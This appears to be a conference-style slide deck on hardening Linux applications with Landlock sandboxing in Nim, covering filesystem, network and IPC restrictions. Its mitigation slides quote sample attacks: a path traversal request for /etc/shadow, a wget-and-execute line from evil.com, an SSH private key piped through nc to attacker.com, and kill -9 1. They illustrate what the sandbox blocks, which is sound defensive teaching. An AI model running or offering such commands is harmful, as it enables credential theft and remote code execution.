---
marp: true
theme: default
paginate: true
header: 'Hardening Linux Apps: Idiomatic Landlock Sandboxing in Nim'
footer: 'Andrea Manzini - Systems Programming Series'
---

# Hardening Linux Apps: Idiomatic Landlock Sandboxing in Nim
### Comprehensive process isolation covering filesystems, network, and IPC.

---

# The Problem: Ambient Rights
Standard Linux processes start with far more permissions than they need. If your app only needs to read a single config file, it usually still has access to your entire home directory and system secrets. Landlock fixes this by allowing a process to drop these rights after it has initialized.

---

# What is Landlock LSM?
Landlock is a Linux Security Module designed for application developers rather than sysadmins. It is completely unprivileged, so any process can start a sandbox without root. It is also stackable, meaning each new ruleset further restricts the application.

---

# The Evolution of Landlock
The API has matured significantly since its debut in Kernel 5.13. What started as basic filesystem control now includes TCP network support in v4, IPC scoping in v6, and atomic multithreaded enforcement in v8. 

**Official Project:** `landlock.io`
**Documentation:** `docs.kernel.org/userspace-api/landlock.html`

---

# Operational Workflow
1. **Define the Ruleset:** Specify which access rights to manage, such as reading files or connecting to ports.
2. **Add Rules:** Bind specific directories or TCP ports to the ruleset.
3. **Restrict the Process:** Apply the restrictions atomically to the process and all its threads.

---

# The Kernel Interface
The system is managed through three key syscalls. `landlock_create_ruleset` initializes the policy, while `landlock_add_rule` handles the mapping of paths and ports. Finally, `landlock_restrict_self` enforces the sandbox. Remember that `PR_SET_NO_NEW_PRIVS` is a mandatory prerequisite.

---

# API Overview: Nim Abstractions
Our Nim wrapper replaces raw bitmasks with type-safe enums like `FsAccess`, `NetAccess`, and `Scope`. The `restrictTo` procedure provides a single interface that automatically handles ABI compatibility across different kernel versions.

---

# DSL and Static Safety
We use Nim macros to provide a declarative `sandbox:` block for readable policies. To ensure security at compile-time, we use a `Sandboxed` capability type. Critical functions can require this type to ensure they are never called outside of a sandbox.

---

# Mitigation: File Path Traversal
Attackers often use `../` sequences to escape a web root and read sensitive files like `/etc/shadow`. Because Landlock enforces security at the kernel inode level, these name-based tricks are ignored. If a file isn't in your ruleset, the `open()` syscall simply returns `EACCES`.

**The Attack:** `curl http://app.local/view?file=../../../../etc/shadow`
**The Result:** The kernel blocks the request before the application even touches the file.

---

# Mitigation: RCE Payload Staging
In a Remote Code Execution scenario, the first goal is often to write a script to `/tmp` and execute it. With Landlock, you can grant write access to a directory while explicitly denying the `Execute` right. The attacker might successfully upload their payload, but they can't run it.

**The Attack:** `wget evil.com/sh.py -O /tmp/sh.py && python3 /tmp/sh.py`
**The Result:** The execution is blocked by the kernel security policy.

---

# Mitigation: Network Exfiltration
If a process is compromised, it may try to connect to an external server to leak data. Using Landlock network support, you can restrict TCP operations to a set of trusted internal ports. Any attempt to connect to an unauthorized remote IP will be denied at the socket level.

**The Attack:** `cat ~/.ssh/id_rsa | nc attacker.com 1337`
**The Result:** Outbound TCP connections to port 1337 are blocked.

---

# Mitigation: IPC and Signals
Attackers use signal injection to interfere with neighboring processes or perform reconnaissance. By enabling IPC scoping, you can isolate your application into its own security domain. The process will be unable to send signals like `SIGKILL` to any PID outside its restricted sandbox.

**The Attack:** `kill -9 1` (Attempting to signal the init process)
**The Result:** The signal is blocked because PID 1 is outside the sandbox domain.

---

# Best Practices
Always check the ABI version to ensure your app degrades gracefully on older kernels. Use the TSYNC flag from ABI v8 for multi-threaded applications, and always fail closed if the sandbox fails to initialize.

---

# Conclusion
Stop trusting the environment and start trusting the kernel. By combining Landlock with Nim, we can build applications that are secure by design.

### Questions?
POC at: `github.com/ilmanzo/landlock-nim-poc`
